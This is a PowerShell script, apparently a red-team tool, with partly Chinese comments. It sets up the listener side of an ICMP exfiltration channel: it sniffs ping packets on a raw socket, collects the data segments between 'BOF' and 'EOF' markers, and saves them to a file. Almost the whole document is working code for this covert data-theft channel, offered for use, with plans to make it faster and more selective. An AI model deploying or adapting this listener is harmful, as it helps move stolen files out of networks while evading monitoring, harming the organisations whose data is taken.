#    Powershell-ICMP-Listener
#    ICMP Exfiltration server script
#    Author: Oddvar Moe (@oddvarmoe)
#    License: BSD 3-Clause
#    Required Dependencies: None
#    Optional Dependencies: None
#    Early alpha version

# 脚本将继续运行，直到接收到包含BOF的ping包
# 脚本将添加来自ICMP数据包的数据，直到收到EOF

### 注意  ###
# IP数据包停在[20]
#ICMP从[21]开始 - https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol 
#$buffer[9] = Type... 1 = ICMP , 6 = TCP
#$buffer[12]+[13]+[14]+[15] = source IP
#$buffer[16]+[17]+[18]+[19] = destination IP
#$buffer[20] = ICMP Type
#$buffer[28] = DATA portion of ICMP
# Entire packet in HEX: [System.BitConverter]::ToString($buffer[0..1499])

# 灵感和帮助
# http://www.drowningintechnicaldebt.com/RoyAshbrook/archive/2013/03/08/how-to-write-a-basic-sniffer-in-powershell.aspx 

# TODO: 
# 需要找到一个动态的方式来枚举文件名和长度
# 使用不同的方法获得更多速度 - 现在速度很慢
# 将其转换为功能
# 确认每个数据包的传输
# 只允许指定的IP发送数据
# 使用客户端脚本发送的文件名保存在服务器端

$Outfile = "C:\pi.txt"
$IP = "127.0.0.1"

# 初始化套接字并绑定
$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
$ICMPSocket.bind($Address)
$ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
$buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize

# 将Capture捕获设置为false
$Capture = $false

while($True)
{
        # 只检查请求数据包 - 类型8
        # 请求
        if([System.BitConverter]::ToString($buffer[20]) -eq "08")
        {
            # IF EOF is received in data segment of ICMP the script will exit the loop.
            # 如果在ICMP的数据段中接收到EOF，脚本将退出循环。
            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "EOF")
            {
                Write-Output "收到EOF - 传输完成 - 保存文件并停止脚本"
                #创建文件 
                [System.Text.Encoding]::ASCII.GetString($Transferbytes) | Out-File $Outfile
                $Capture = $false
                break
            } 
            
            
            if($Capture)
            {
                # 将文件内容捕获到byte数组中"
                [byte[]]$Transferbytes += $buffer[28..1499]
            }
            # Byte 28 = BOF
            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "BOF")
            {
                # 匹配BOF
                Write-Output "BOF收到 - 开始捕获文件"
                # 需要找到枚举文件名的动态方法
                $Filename = [System.Text.Encoding]::ASCII.GetString($buffer[31..46])
                $Capture = $true       
            } 
        }
        $null = $ICMPSocket.Receive($buffer)
}